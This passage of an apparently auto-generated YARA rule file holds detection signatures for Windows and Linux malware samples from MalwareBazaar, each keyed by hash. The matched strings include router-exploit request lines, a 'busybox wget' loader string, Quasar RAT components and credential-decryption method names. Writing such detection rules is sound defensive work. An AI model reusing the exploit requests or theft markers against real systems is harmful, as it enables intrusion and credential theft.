        $s1 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 1168KB and
        all of them
}

rule Linux_e4c60f1c969ea093b535974d9357749d73c99d1e232972538978c94e9e495ec9
{
    meta:
        description = "Auto ML: e4c60f1c969ea093b535974d9357749d73c99d1e232972538978c94e9e495ec9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "5N&\"a"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 57KB and
        all of them
}

rule Windows_e5035e4cba47e08ae750fb3fb85dc943d86604d7ab665e605a1842cbc9e1edce
{
    meta:
        description = "Auto ML: e5035e4cba47e08ae750fb3fb85dc943d86604d7ab665e605a1842cbc9e1edce"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "TEMP"
        $s7 = "USERPROFILE"
        $s8 = "GetUserDefaultUILanguage"
        $s9 = "kernel32.dll"
        $s10 = "TCustomFile"
        $s11 = "TFile"
        $s12 = "EFileError"
        $s13 = "File I/O error %d"
        $s14 = "TCompressedBlockReader"
        $s15 = "TSetupLanguageEntryA"
        $s16 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s17 = "shell32.dll"
        $s18 = "InnoSetupLdrWindow"
        $s19 = "Inno Setup Setup Data (5.2.3)"
        $s20 = "Inno Setup Messages (5.1.11)"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 17170KB and
        all of them
}

rule Windows_e5bbcc08742357941d284511b0a7e9528ccc6a7bb9fa8d544cadf2b97f19e8da
{
    meta:
        description = "Auto ML: e5bbcc08742357941d284511b0a7e9528ccc6a7bb9fa8d544cadf2b97f19e8da"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "!setybdeta}"
        $s5 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s6 = "PGma.System.MouseKeyHook, Version=5.6.130.0, Culture=neutral, PublicKeyToken=null"
        $s7 = "DQuasar.Common, Version=1.4.1.0, Culture=neutral, PublicKeyToken=null"
        $s8 = "SetEofOn00"
        $s9 = "<GetPacketTypes>b__3_0"
        $s10 = "<WinSCPDecrypt>b__4_0"
        $s11 = "OffsetMAIN_0"
        $s12 = "<GetReverseProxyByConnectionId>b__0"
        $s13 = "<GetKeyValues>b__0"
        $s14 = "<Process>b__0"
        $s15 = "get_Scan0"
        $s16 = "ProcessCrlB1"
        $s17 = "MicrosoftCertTemplateV1"
        $s18 = "get_KnowledgeProofForX1"
        $s19 = "Http_1_1"
        $s20 = "<GetKeyValues>b__15_1"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3189KB and
        all of them
}

rule Windows_e5ceb36a479f4affece79593a04374e43b3619ab38e64b1b36a76b25a149baff
{
    meta:
        description = "Auto ML: e5ceb36a479f4affece79593a04374e43b3619ab38e64b1b36a76b25a149baff"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".rsrc"
        $s3 = "@.reloc"
        $s4 = "System"
        $s5 = "System.Runtime.CompilerServices"
        $s6 = "TargetFrameworkAttribute"
        $s7 = "System.Runtime.Versioning"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "System.Core"
        $s10 = "System.Diagnostics"
        $s11 = "<Module>"
        $s12 = "System.IO"
        $s13 = "<Module>{D918C633-1D55-4A4A-A483-97AAB9736658}"
        $s14 = "jn7XVnGmM4lMlCMDGTc"
        $s15 = "System.Text"
        $s16 = "get_Length"
        $s17 = "get_Chars"
        $s18 = "System.Collections.Generic"
        $s19 = "System.Linq"
        $s20 = "GetEnumerator"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1564KB and
        all of them
}

rule Windows_e5d737a35fb95bfbe2279f5215791c318faed984a5ceae76c96dab46d6be6990
{
    meta:
        description = "Auto ML: e5d737a35fb95bfbe2279f5215791c318faed984a5ceae76c96dab46d6be6990"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Runtime.CompilerServices"
        $s5 = "System"
        $s6 = "System.Diagnostics"
        $s7 = "System.Reflection"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "AssemblyFileVersionAttribute"
        $s10 = "TargetFrameworkAttribute"
        $s11 = "System.Runtime.Versioning"
        $s12 = "System.Resources"
        $s13 = "AssemblyKeyFileAttribute"
        $s14 = "belgian_it_development_division.exe"
        $s15 = "<Module>"
        $s16 = "ThreadSafeObjectProvider`1"
        $s17 = "MySettings"
        $s18 = "ApplicationSettingsBase"
        $s19 = "System.Configuration"
        $s20 = "MySettingsProperty"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5251KB and
        all of them
}

rule Windows_e5fd5bbe986493e44b2d137904fc59ec939113d953c793deb06806dbba3b138b
{
    meta:
        description = "Auto ML: e5fd5bbe986493e44b2d137904fc59ec939113d953c793deb06806dbba3b138b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "get_RfzG"
        $s6 = "System.IO"
        $s7 = "System.Xml.Schema"
        $s8 = "GetTypedTableSchema"
        $s9 = "ReadXmlSchema"
        $s10 = "WriteXmlSchema"
        $s11 = "GetTypedDataSetSchema"
        $s12 = "System.Data"
        $s13 = "GetSerializationData"
        $s14 = "GetData"
        $s15 = "System.Collections.Generic"
        $s16 = "Read"
        $s17 = "add_Load"
        $s18 = "HomeCarStore_Load"
        $s19 = "SetAdded"
        $s20 = "set_Enabled"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 522KB and
        all of them
}

rule Windows_e5feb57c693a717e60b49100052433cddaa0bc787def83db90dcd04e0c1db67d
{
    meta:
        description = "Auto ML: e5feb57c693a717e60b49100052433cddaa0bc787def83db90dcd04e0c1db67d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".data"
        $s2 = "kernel32.dll"
        $s3 = "GetProcAddress"
        $s4 = "GetModuleHandleA"
        $s5 = "LoadLibraryA"
        $s6 = "user32.dll"
        $s7 = "winmm.dll"
        $s8 = "winspool.drv"
        $s9 = "advapi32.dll"
        $s10 = "shell32.dll"
        $s11 = "oleaut32.dll"
        $s12 = "comctl32.dll"
        $s13 = "comdlg32.dll"
        $s14 = "RegCreateKeyExA"
        $s15 = "Shell_NotifyIconA"
        $s16 = "VariantChangeTypeEx"
        $s17 = "StringFileInfo"
        $s18 = "FileDescription"
        $s19 = "FileVersion"
        $s20 = "OriginalFilename"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1096KB and
        all of them
}

rule Windows_15fea9eac12da70b8e5bca9f6135985426506df8b08585af0ce4b438abde78f6
{
    meta:
        description = "Auto ML: 15fea9eac12da70b8e5bca9f6135985426506df8b08585af0ce4b438abde78f6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 6619KB and
        all of them
}

rule Linux_e5ff2d440b6a72f5afbee8734166221aaf365fbc210270d4f9482609d15ca683
{
    meta:
        description = "Auto ML: e5ff2d440b6a72f5afbee8734166221aaf365fbc210270d4f9482609d15ca683"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 29KB and
        all of them
}

rule Windows_e6032f19912376cf1309dd2586a98236bae532e2e0f50be16d13d515727d0196
{
    meta:
        description = "Auto ML: e6032f19912376cf1309dd2586a98236bae532e2e0f50be16d13d515727d0196"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "SELECT * FROM Win32_OperatingSystem"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetDefaultDllDirectories"
        $s9 = "s:IDS_BROWSETITLE"
        $s10 = "s:IDS_CMDEXTRACTING"
        $s11 = "s:IDS_FILEHEADERBROKEN"
        $s12 = "s:IDS_CANNOTOPEN"
        $s13 = "s:IDS_CANNOTCREATE"
        $s14 = "s:IDS_WRITEERROR"
        $s15 = "s:IDS_READERROR"
        $s16 = "s:IDS_CLOSEERROR"
        $s17 = "s:IDS_CREATEERRORS"
        $s18 = "s:IDS_ALLFILES"
        $s19 = "s:IDS_EXTRFILESTO"
        $s20 = "s:IDS_EXTRFILESTOTEMP"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 906KB and
        all of them
}

rule Windows_e62c9dfca29286701a32906b8224fcb23feac091e9f1c834e000ff8c0cb84b88
{
    meta:
        description = "Auto ML: e62c9dfca29286701a32906b8224fcb23feac091e9f1c834e000ff8c0cb84b88"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "FlsSetValue"
        $s6 = "FlsGetValue"
        $s7 = "CorExitProcess"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "`local static thread guard'"
        $s16 = "`placement delete[] closure'"
        $s17 = "`placement delete closure'"
        $s18 = "delete[]"
        $s19 = "delete"
        $s20 = "`non-type-template-parameter"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 233KB and
        all of them
}

rule Linux_e63d0ea1b148014f7c74a948ba34bd6cac4244fb0ee87e6f4035312e106254b7
{
    meta:
        description = "Auto ML: e63d0ea1b148014f7c74a948ba34bd6cac4244fb0ee87e6f4035312e106254b7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/tmp/tempXXXXXX"
        $s2 = "/proc/self/cmdline"
        $s3 = "No such file or directory"
        $s4 = "No such process"
        $s5 = "Interrupted system call"
        $s6 = "Bad file descriptor"
        $s7 = "No child processes"
        $s8 = "Resource temporarily unavailable"
        $s9 = "File exists"
        $s10 = "Too many open files in system"
        $s11 = "Too many open files"
        $s12 = "Text file busy"
        $s13 = "File too large"
        $s14 = "Read-only file system"
        $s15 = "File name too long"
        $s16 = "Level 3 reset"
        $s17 = "Bad font file format"
        $s18 = "Multihop attempted"
        $s19 = "File descriptor in bad state"
        $s20 = "Attempting to link in too many shared libraries"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 50KB and
        all of them
}

rule Linux_e669148a04ee9c8dedd097123812c0c77dfa7f232d0bdc652914e8b744e8038c
{
    meta:
        description = "Auto ML: e669148a04ee9c8dedd097123812c0c77dfa7f232d0bdc652914e8b744e8038c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "/usr/libexec/openssh/sftp-server"
        $s12 = "shell"
        $s13 = "httpd"
        $s14 = "system"
        $s15 = "wget-log"
        $s16 = "1337SoraLOADER"
        $s17 = "nloads"
        $s18 = "elfLoad"
        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 149KB and
        all of them
}

rule Linux_e66a994abbc096d375e249f63e3374856b0021acef9a662d1a100b1d02f74c85
{
    meta:
        description = "Auto ML: e66a994abbc096d375e249f63e3374856b0021acef9a662d1a100b1d02f74c85"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 30KB and
        all of them
}

rule Windows_e6aa74189e7f0e76c61715f31439a43360b3b66f86e899b3c621c817298623d0
{
    meta:
        description = "Auto ML: e6aa74189e7f0e76c61715f31439a43360b3b66f86e899b3c621c817298623d0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "FlsSetValue"
        $s7 = "FlsGetValue"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "`local static thread guard'"
        $s16 = "`placement delete[] closure'"
        $s17 = "`placement delete closure'"
        $s18 = "delete[]"
        $s19 = "delete"
        $s20 = "GAIsProcessorFeaturePresent"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 348KB and
        all of them
}

rule Windows_e6e106a5206be28f2b76c0190d3c1ba85d4f4bf759babd66c64d9a17a4219ddb
{
    meta:
        description = "Auto ML: e6e106a5206be28f2b76c0190d3c1ba85d4f4bf759babd66c64d9a17a4219ddb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "FlsSetValue"
        $s7 = "FlsGetValue"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "GAIsProcessorFeaturePresent"
        $s16 = "KERNEL32"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 312KB and
        all of them
}

rule Windows_e6e1106fec7137b46da15bdd0853b1b9a6104bce649a24145793e4d451261c6b
{
    meta:
        description = "Auto ML: e6e1106fec7137b46da15bdd0853b1b9a6104bce649a24145793e4d451261c6b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = "ADVAPI32.dll"
        $s3 = "api-ms-win-crt-heap-l1-1-0.dll"
        $s4 = "api-ms-win-crt-locale-l1-1-0.dll"
        $s5 = "api-ms-win-crt-math-l1-1-0.dll"
        $s6 = "api-ms-win-crt-runtime-l1-1-0.dll"
        $s7 = "api-ms-win-crt-stdio-l1-1-0.dll"
        $s8 = "api-ms-win-crt-string-l1-1-0.dll"
        $s9 = "bcrypt.dll"
        $s10 = "KERNEL32.DLL"
        $s11 = "EventWrite"
        $s12 = "_configthreadlocale"
        $s13 = "_set_fmode"
        $s14 = "ExitProcess"
        $s15 = "GetProcAddress"
        $s16 = "LoadLibraryA"
        $s17 = "CoCreateGuid"
        $s18 = "https://sectigo.com/CPS0"
        $s19 = "3http://crl.sectigo.com/SectigoRSATimeStampingCA.crl0t"
        $s20 = "3http://crt.sectigo.com/SectigoRSATimeStampingCA.crt0#"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 800KB and
        all of them
}

rule Linux_e6e8f9c514a81f8297958f07a86d1f95d4b5b92307cb837a4ac8c4d1120e8c72
{
    meta:
        description = "Auto ML: e6e8f9c514a81f8297958f07a86d1f95d4b5b92307cb837a4ac8c4d1120e8c72"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "|http"
        $s4 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 28KB and
        all of them
}

rule Windows_16267dd392fbffa74f3212173518202de9863e6ab7e9fc9482e780ad240b01d2
{
    meta:
        description = "Auto ML: 16267dd392fbffa74f3212173518202de9863e6ab7e9fc9482e780ad240b01d2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = ".rsrc"
        $s4 = "MSVBVM60.DLL"
        $s5 = "Install, Setup or Update"
        $s6 = "This sets the present colors as default. When you restart, these will be the colors that appear."
        $s7 = "This resets the default colors. When you restart, these will be the colors that appear."
        $s8 = "This sets the size as the default. Use it to create shapes of the same size."
        $s9 = "MSComDlg.CommonDialog"
        $s10 = "Toggle Display Window"
        $s11 = "ConnectingLine"
        $s12 = "mnuFile"
        $s13 = "&File"
        $s14 = "mnuOpen"
        $s15 = "&Open..."
        $s16 = "ReadyState"
        $s17 = "Shdocvw.dll"
        $s18 = "OWC11.Spreadsheet"
        $s19 = "Spreadsheet"
        $s20 = "WindowEditor"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB and
        all of them
}

rule Windows_e7236fe777e772afa5fe027e6013318ae8724059ee3d05101771d4528e7fc5b6
{
    meta:
        description = "Auto ML: e7236fe777e772afa5fe027e6013318ae8724059ee3d05101771d4528e7fc5b6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "GetNativeSystemInfo"
        $s7 = "kernel32.dll"
        $s8 = "FlsGetValue"
        $s9 = "FlsSetValue"
        $s10 = "delete"
        $s11 = "delete[]"
        $s12 = "`placement delete closure'"
        $s13 = "`placement delete[] closure'"
        $s14 = "`local static thread guard'"
        $s15 = "CorExitProcess"
        $s16 = "GetCurrentPackageId"
        $s17 = "GetDateFormatEx"
        $s18 = "GetSystemTimePreciseAsFileTime"
        $s19 = "GetTimeFormatEx"
        $s20 = "internal error: invalid forward reference offset"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1257KB and
        all of them
}

rule Windows_e7258b68c24a165c0c61f1fe16a15dd642cf118eae9a4405d3d3cee174d1c72e
{
    meta:
        description = "Auto ML: e7258b68c24a165c0c61f1fe16a15dd642cf118eae9a4405d3d3cee174d1c72e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "gdiplus.dll"
        $s7 = "Cabinet.dll"
        $s8 = "USER32.dll"
        $s9 = "ADVAPI32.dll"
        $s10 = "SHELL32.dll"
        $s11 = "OLEAUT32.dll"
        $s12 = "regex_error(error_complexity): The complexity of an attempted match against a regular expression exceeded a pre-set level."
        $s13 = "no such process"
        $s14 = "already connected"
        $s15 = "bad file descriptor"
        $s16 = "connection aborted"
        $s17 = "connection already in progress"
        $s18 = "connection refused"
        $s19 = "connection reset"
        $s20 = "file exists"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5854KB and
        all of them
}

rule Windows_e72ab72a888f6ef0627bb1ea5452a168792d1dc4037b74c34cc557eb5d2fe000
{
    meta:
        description = "Auto ML: e72ab72a888f6ef0627bb1ea5452a168792d1dc4037b74c34cc557eb5d2fe000"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "System.Drawing.Drawing2D"
        $s6 = "get_fApwG"
        $s7 = "GetFEN"
        $s8 = "SetFEN"
        $s9 = "System.IO"
        $s10 = "get_PositionX"
        $s11 = "set_PositionX"
        $s12 = "get_PositionY"
        $s13 = "set_PositionY"
        $s14 = "System.Media"
        $s15 = "Thread"
        $s16 = "UserControl1_Load"
        $s17 = "Form1_Load"
        $s18 = "add_Load"
        $s19 = "UcChessBoard_Load"
        $s20 = "UcChessPiece_Load"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 653KB and
        all of them
}

rule Linux_e766d38ae0ec1ce75fc05559c73f66cd5a66040296d89f8608a0a21034e9f59a
{
    meta:
        description = "Auto ML: e766d38ae0ec1ce75fc05559c73f66cd5a66040296d89f8608a0a21034e9f59a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "http://"
        $s2 = "https://"
        $s3 = "/ (deleted)"
        $s4 = "/lib/systemd/"
        $s5 = "/system/system/bin/"
        $s6 = "/data/module/jdk"
        $s7 = "No such file or directory"
        $s8 = "No such process"
        $s9 = "Interrupted system call"
        $s10 = "Bad file descriptor"
        $s11 = "No child processes"
        $s12 = "Resource temporarily unavailable"
        $s13 = "File exists"
        $s14 = "Too many open files in system"
        $s15 = "Too many open files"
        $s16 = "Text file busy"
        $s17 = "File too large"
        $s18 = "Read-only file system"
        $s19 = "File name too long"
        $s20 = "Level 3 reset"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 127KB and
        all of them
}

rule Windows_e7880ebcc97729c41e3e537f4b9b61f8e24c9b0f257805855e26e89f70edecd9
{
    meta:
        description = "Auto ML: e7880ebcc97729c41e3e537f4b9b61f8e24c9b0f257805855e26e89f70edecd9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "ThreadSafeObjectProvider`1"
        $s6 = "System"
        $s7 = "get_Computer"
        $s8 = "get_Application"
        $s9 = "User"
        $s10 = "get_User"
        $s11 = "m_UserObjectProvider"
        $s12 = "get_WebServices"
        $s13 = "GetHashCode"
        $s14 = "GetType"
        $s15 = "Create__Instance__"
        $s16 = "get_GetInstance"
        $s17 = "m_ThreadStaticValue"
        $s18 = "GetInstance"
        $s19 = "System.Text"
        $s20 = "user32.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 27KB and
        all of them
}

rule Windows_e7d05102c4737019c554a7d3238ba9654c0e09d0e76590cf8c6f8fe3038d07b4
{
    meta:
        description = "Auto ML: e7d05102c4737019c554a7d3238ba9654c0e09d0e76590cf8c6f8fe3038d07b4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "OOS - Purchase Order - LAM-2023-00555.exe"
        $s5 = "System.Net.Http"
        $s6 = "System"
        $s7 = "System.Collections.Concurrent"
        $s8 = "System.Collections.Generic"
        $s9 = "System.Diagnostics"
        $s10 = "System.IO"
        $s11 = "HttpClient"
        $s12 = "System.Reflection"
        $s13 = "AssemblyFileVersionAttribute"
        $s14 = "System.Reflection.Emit"
        $s15 = "System.Runtime.CompilerServices"
        $s16 = "System.Runtime.InteropServices"
        $s17 = "TargetFrameworkAttribute"
        $s18 = "System.Runtime.Versioning"
        $s19 = "System.Text"
        $s20 = "System.Threading"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 17KB and
        all of them
}

rule Windows_e7feb941ec0838dac58cf9cd48699ac60252001dc98ebd09f357cb14985d6398
{
    meta:
        description = "Auto ML: e7feb941ec0838dac58cf9cd48699ac60252001dc98ebd09f357cb14985d6398"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = ".reloc"
        $s4 = "@.rsrc"
        $s5 = "ExitProcess"
        $s6 = "GetModuleHandleA"
        $s7 = "LoadLibraryA"
        $s8 = "GetModuleFileNameW"
        $s9 = "KERNEL32.dll"
        $s10 = "user32.dll"
        $s11 = "GetModuleFileNameA"
        $s12 = "USER32.dll"
        $s13 = "StringFileInfo"
        $s14 = "FileDescription"
        $s15 = "FileVersion"
        $s16 = "OriginalFilename"
        $s17 = "qoffscreen.dll"
        $s18 = "VarFileInfo"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2346KB and
        all of them
}

rule Windows_e83a5ef9af52b5f878238e652094c5470adf518ea914cdf2802d377ad812e08f
{
    meta:
        description = "Auto ML: e83a5ef9af52b5f878238e652094c5470adf518ea914cdf2802d377ad812e08f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".data"
        $s3 = "CoCreateInstance"
        $s4 = "DeleteUrlCacheEntry"
        $s5 = "ExitProcess"
        $s6 = "GetCommandLineA"
        $s7 = "GetComputerNameA"
        $s8 = "GetCurrentProcessId"
        $s9 = "GetCurrentThreadId"
        $s10 = "GetExitCodeThread"
        $s11 = "GetFileSize"
        $s12 = "GetModuleFileNameA"
        $s13 = "GetModuleHandleA"
        $s14 = "CloseHandle"
        $s15 = "GetProcAddress"
        $s16 = "GetSystemDirectoryA"
        $s17 = "GetTempPathA"
        $s18 = "GetTickCount"
        $s19 = "GetVersion"
        $s20 = "GetVersionExA"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 338KB and
        all of them
}

rule Windows_e84d658c4489812aa7c0fc44e8ce1832427f201c5c40872f160238eb3af31a75
{
    meta:
        description = "Auto ML: e84d658c4489812aa7c0fc44e8ce1832427f201c5c40872f160238eb3af31a75"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "P`.data"
        $s3 = ".rdata"
        $s4 = "CloseHandle"
        $s5 = "ConnectNamedPipe"
        $s6 = "CreateFileA"
        $s7 = "CreateNamedPipeA"
        $s8 = "CreateThread"
        $s9 = "DeleteCriticalSection"
        $s10 = "GetCurrentProcess"
        $s11 = "GetCurrentProcessId"
        $s12 = "GetCurrentThreadId"
        $s13 = "GetLastError"
        $s14 = "GetModuleHandleA"
        $s15 = "GetProcAddress"
        $s16 = "GetStartupInfoA"
        $s17 = "GetSystemTimeAsFileTime"
        $s18 = "GetTickCount"
        $s19 = "ReadFile"
        $s20 = "SetUnhandledExceptionFilter"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 15KB and
        all of them
}

rule Windows_e872ec40a4c2ca42b1330b6b6332ac44705ec697432c901aa39e93edb7765531
{
    meta:
        description = "Auto ML: e872ec40a4c2ca42b1330b6b6332ac44705ec697432c901aa39e93edb7765531"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
